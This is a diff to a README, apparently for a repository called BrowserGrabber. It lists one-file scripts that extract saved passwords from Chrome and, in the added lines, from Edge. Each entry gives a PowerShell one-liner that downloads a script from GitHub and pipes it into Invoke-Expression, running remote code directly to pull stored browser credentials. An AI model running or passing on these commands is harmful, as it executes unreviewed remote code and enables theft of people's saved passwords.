@@ -14,3 +14,8 @@ One file script to extract passwords from Chrome
 Quick command: (Invoke-WebRequest https://raw.githubusercontent.com/Ethical-Kaizoku/BrowserGrabber/main/Get-ChromePasswords.ps1 -UseBasicParsing).Content | IEX
 
 Source: https://github.com/thisismyrobot/chrome-decrypt.ps1
+
+# EdgeCredentials
+One file script to extract passwords from Edge
+
+Quick command: (Invoke-WebRequest https://raw.githubusercontent.com/Ethical-Kaizoku/BrowserGrabber/main/Get-EdgePasswords.ps1 -UseBasicParsing).Content | IEX
